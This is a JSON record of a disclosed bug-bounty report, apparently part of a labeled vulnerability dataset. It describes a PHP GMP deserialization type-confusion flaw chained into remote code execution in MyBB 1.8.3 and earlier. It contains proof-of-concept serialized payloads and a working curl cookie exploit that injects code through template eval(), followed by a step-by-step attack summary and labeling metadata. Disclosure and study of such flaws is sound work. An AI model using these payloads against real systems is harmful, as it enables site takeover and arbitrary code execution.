{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "ryat ",
  "title": "GMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]",
  "content": "\nGMP Deserialization Type Confusion Vulnerability [MyBB <= 1.8.3 RCE Vulnerability]\nTaoguang Chen [@chtg57](https://twitter.com/chtg57) - Write Date: 2015.4.28\nA type-confusion vulnerability was discovered in GMP deserialization with crafted object's __wakeup() magic method that can be abused for updating any already assigned properties of any already created objects, this result in serious security issues.\nAffected Versions\nAffected is PHP 5.6 < 5.6.30\nCredits\nThis vulnerability was disclosed by Taoguang Chen.\nDescription\ngmp.c\nCode 604 Bytes\n1static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* {{{ */\n2{\n3\t...\n4\tALLOC_INIT_ZVAL(zv_ptr);\n5\tif (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)\n6\t\t|| Z_TYPE_P(zv_ptr) != IS_ARRAY\n7\t) {\n8\t\tzend_throw_exception(NULL, \"Could not unserialize properties\", 0 TSRMLS_CC);\n9\t\tgoto exit;\n10\t}\n11\n12\tif (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) {\n13\t\tzend_hash_copy(\n14\t\t\tzend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),\n15\t\t\t(copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)\n16\t\t);\n17\t}\nzend_object_handlers.c\nCode 216 Bytes\n1ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* {{{ */\n2{\n3\tzend_object *zobj;\n4\tzobj = Z_OBJ_P(object);\n5\tif (!zobj->properties) {\n6\t\trebuild_object_properties(zobj);\n7\t}\n8\treturn zobj->properties;\n9}\nIt has been demonstrated many times before that __wakeup() or other magic methods leads to ZVAL was changed from the memory in during deserializtion. So an attacker can change **object into an integer-type or bool-type ZVAL, then the attacker will be able to access any objects that stored in objects store via Z_OBJ_P. This means the attacker will be able to update any properties in the object via zend_hash_copy(). It is possible to lead to various problems and including security issues.\nThe following codes will prove this vulnerability:\nCode 341 Bytes\n1<?php\n2\n3class obj\n4{\n5\tvar $ryat;\n6\t\n7\tfunction __wakeup()\n8\t{\n9\t\t$this->ryat = 1;\n10\t}\n11}\n12\n13$obj = new stdClass;\n14$obj->aa = 1;\n15$obj->bb = 2;\n16\n17$inner = 's:1:\"1\";a:3:{s:2:\"aa\";s:2:\"hi\";s:2:\"bb\";s:2:\"hi\";i:0;O:3:\"obj\":1:{s:4:\"ryat\";R:2;}}';\n18$exploit = 'a:1:{i:0;C:3:\"GMP\":'.strlen($inner).':{'.$inner.'}}';\n19$x = unserialize($exploit);\n20var_dump($obj);\n21\n22?>\nExpected result:\nCode 66 Bytes\n1object(stdClass)#1 (2) {\n2  [\"aa\"]=>\n3  int(1)\n4  [\"bb\"]=>\n5  int(2)\n6}\nActual result:\nCode 143 Bytes\n1object(stdClass)#1 (3) {\n2  [\"aa\"]=>\n3  string(2) \"hi\"\n4  [\"bb\"]=>\n5  string(2) \"hi\"\n6  [0]=>\n7  object(obj)#3 (1) {\n8    [\"ryat\"]=>\n9    &int(1)\n10  }\n11}\ni) How to exploited this bug in real world?\nOn php 5.6 <= 5.6.11, DateInterval's __wakeup() use convert_to_long() handles and reassignments its properties (it has been demonstrated many times), so an attacker can convert GMP object to an any integer-type ZVAL via GMP's gmp_cast_object():\nCode 303 Bytes\n1static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* {{{ */\n2{\n3    mpz_ptr gmpnum;\n4    switch (type) {\n5    ...\n6    case IS_LONG:\n7        gmpnum = GET_GMP_FROM_ZVAL(readobj);\n8        INIT_PZVAL(writeobj);\n9        ZVAL_LONG(writeobj, mpz_get_si(gmpnum));\n10        return SUCCESS;\nThe following codes will prove this exploite way:\nCode 119 Bytes\n1<?php\n2\n3var_dump(unserialize('a:2:{i:0;C:3:\"GMP\":17:{s:4:\"1234\";a:0:{}}i:1;O:12:\"DateInterval\":1:{s:1:\"y\";R:2;}}'));\n4\n5?>\nOf course, a crafted __wakeup() can also be exploited, ex:\nCode 71 Bytes\n1<?php\n2\n3function __wakeup()\n4{\n5    $this->ryat = (int) $this->ryat;\n6}\n7\n8?>\nii) Can be exploited this bug in real app?\nOn MyBB <= 1.8.3:\nindex.php\nCode 122 Bytes\n1\tif(isset($mybb->cookies['mybb']['forumread']))\n2\t{\n3\t\t$forumsread = my_unserialize($mybb->cookies['mybb']['forumread']);\n4\t}\nMyBB <= 1.8.3 allow deserialized cookies via unserialize(), so an attacker will be able to update $mybb or other object's any properties, and it is possible to lead to security issues easily, ex: xss, sql injection, remote code execution and etc. :-)\nP.S. I had reported this vulnerability and it had been fixed in mybb >= 1.8.4.\nProof of Concept Exploit\nMyBB <= 1.8.3 RCE vulnerability\nindex.php\nCode 49 Bytes\n1eval('$index = \"'.$templates->get('index').'\";');\nMyBB always use eval() function in during template parsing.\ninc/class_templates.php\nCode 208 Bytes\n1class templates\n2{\n3\t...\n4\tpublic $cache = array();\n5\t...\n6\tfunction get($title, $eslashes=1, $htmlcomments=1)\n7\t{\n8\t\tglobal $db, $theme, $mybb;\n9\t\t...\n10\t\t$template = $this->cache[$title];\n11\t\t...\n12\t\treturn $template;\n13\t}\nIf we can control the $cache, we will be albe to inject php code via eval() function.\ninc/init.php\nCode 338 Bytes\n1$error_handler = new errorHandler();\n2...\n3$maintimer = new timer();\n4...\n5$mybb = new MyBB;\n6...\n7switch($config['database']['type'])\n8{\n9\tcase \"sqlite\":\n10\t\t$db = new DB_SQLite;\n11\t\tbreak;\n12\tcase \"pgsql\":\n13\t\t$db = new DB_PgSQL;\n14\t\tbreak;\n15\tcase \"mysqli\":\n16\t\t$db = new DB_MySQLi;\n17\t\tbreak;\n18\tdefault:\n19\t\t$db = new DB_MySQL;\n20}\n21...\n22$templates = new templates;\nThe $templates object was instantiated in init.php, and four objects was instantiated in this before. This means the $templates object's handle was set to 5 and stored into objects store, so we can access the $templates object and update the $cache property via convert GMP object into integer-type ZVAL that value is 5 in during GMP deserialization. This also means we can inject php code via eval() function.\nWhen MyBB <= 1.8.3 and PHP5.6 <= 5.6.11, remote code execution by just using curl on the command line:\nCode 203 Bytes\n1curl --cookie 'mybb[forumread]=a:1:{i:0%3bC:3:\"GMP\":106:{s:1:\"5\"%3ba:2:{s:5:\"cache\"%3ba:1:{s:5:\"index\"%3bs:14:\"{${phpinfo()}}\"%3b}i:0%3bO:12:\"DateInterval\":1:{s:1:\"y\"%3bR:2%3b}}}}' http://127.0.0.1/mybb/\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1570979460,
  "report_url": "https://hackerone.com/reports/198734",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Identify the target system running MyBB <= 1.8.3 and PHP 5.6 <= 5.6.11."
    ],
    [
      2,
      "Craft a malicious cookie payload that exploits the GMP deserialization type confusion vulnerability to manipulate the $templates object's $cache property."
    ],
    [
      3,
      "Send the crafted cookie to the target system via a curl command or similar HTTP request."
    ],
    [
      4,
      "Trigger the eval() function in the template parsing process to execute arbitrary PHP code."
    ]
  ],
  "vuln_description": "The vulnerability is a type-confusion issue in PHP's GMP deserialization that allows an attacker to manipulate object properties during deserialization. This can be exploited to update any properties of any object in the object store, leading to remote code execution in MyBB <= 1.8.3 by manipulating the $templates object's $cache property.",
  "reason": "This vulnerability involves multiple complex components: understanding PHP's GMP deserialization flaw, manipulating object properties during deserialization, and leveraging MyBB's template system to execute arbitrary code. The attack requires deep knowledge of PHP internals and MyBB's architecture, as well as the ability to chain these components together effectively.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves PHP's GMP deserialization flaw affecting MyBB <= 1.8.3, allowing property manipulation via crafted __wakeup() magic method. This can lead to RCE through template cache manipulation. The detection methodology focuses on session/action/resource manipulation within the same application context, which doesn't directly apply here as it requires specific deserialization payloads and PHP version constraints.",
    "is_detectable": false
  }
}